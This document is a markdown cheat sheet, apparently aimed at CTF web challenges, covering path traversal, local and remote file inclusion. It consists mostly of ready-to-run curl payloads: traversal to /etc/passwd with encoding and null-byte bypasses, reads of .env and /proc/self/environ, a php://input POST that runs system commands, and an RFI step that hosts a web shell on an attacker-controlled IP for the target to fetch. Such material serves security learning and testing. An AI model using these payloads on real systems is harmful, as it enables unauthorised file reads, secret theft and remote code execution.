# Path Traversal / LFI / RFI

## Fastest First-Pass Checklist

```bash
# Purpose: cheapest possible LFI probe against a param that looks like a filename/path
curl -s "https://target.example/view?file=../../../../etc/passwd"

# Purpose: URL-encoded variant in case the app decodes once but a WAF/filter checks the raw string
curl -s "https://target.example/view?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
```

## Technique: Local File Inclusion (LFI) / Path Traversal

**When to use it**: any parameter that plausibly names a file (`file=`,
`page=`, `template=`, `lang=`, `path=`).

**Fast path**:
```bash
# Purpose: basic traversal, depth of ../ usually needs to exceed the app's actual directory depth
curl -s "https://target.example/view?file=../../../../etc/passwd"

# Purpose: null-byte truncation for legacy PHP if the app appends an extension server-side
curl -s "https://target.example/view?file=../../../../etc/passwd%00"

# Purpose: double URL-encoding to survive a single decode-and-filter step
curl -s "https://target.example/view?file=..%252f..%252f..%252fetc%252fpasswd"
```
**Indicators**: `/etc/passwd` content returned (Linux) or a Windows
equivalent (`C:\Windows\win.ini` via `..\..\..\windows\win.ini`).

**Next Step**: once traversal is confirmed, target files relevant to the
app itself for higher-value reads: source code
(`/var/www/html/config.php`), environment files (`.env`), the app's own
process info (`/proc/self/environ`, `/proc/self/cmdline` on Linux) — env
vars are a common flag-storage location in CTF web challenges.

## Technique: PHP Wrappers (Filter Chains, RCE)

**Fast path**:
```bash
# Purpose: read a PHP source file as base64 to avoid execution and see raw source
curl -s "https://target.example/view?file=php://filter/convert.base64-encode/resource=index.php"

# Purpose: php://input as a traversal-adjacent RCE vector, if allow_url_include is on and file= reaches include()
curl -s -X POST "https://target.example/view?file=php://input" -d '<?php system("cat /flag"); ?>'
```
**Indicators**: base64 output decodes to readable PHP source — confirms
`include()`/`require()` is the underlying sink, not just `file_get_contents`
(which changes what's exploitable — wrapper-based reads work regardless,
but `php://input`-based RCE only works when the include actually executes
the fetched content as PHP).

## Technique: Remote File Inclusion (RFI)

**When to use it**: LFI-style param that also fetches remote URLs (rare in
modern PHP configs, but check).

**Fast path**:
```bash
# Purpose: host a payload and see if the app fetches + executes it
python3 -m http.server 8000  # serving shell.txt containing <?php system($_GET['c']); ?>
curl -s "https://target.example/view?file=http://YOUR_IP:8000/shell.txt"
```
**Indicators**: your HTTP server's logs show an incoming request from the
target — confirms remote fetch even if execution isn't yet proven.

## Common Mistakes

- Not trying enough `../` depth — traversal needs to exceed the actual
  base directory nesting; if 4 doesn't work, try 6-8 before concluding
  it's not traversable.
- Forgetting encoding variants (single, double, null-byte) when a naive
  string-match filter is blocking the literal `../`.
- Reading `/etc/passwd` as "proof" and stopping — for CTF purposes the
  flag is rarely there; pivot to app-specific files (source, `.env`,
  `/proc/self/environ`) once traversal itself is confirmed.
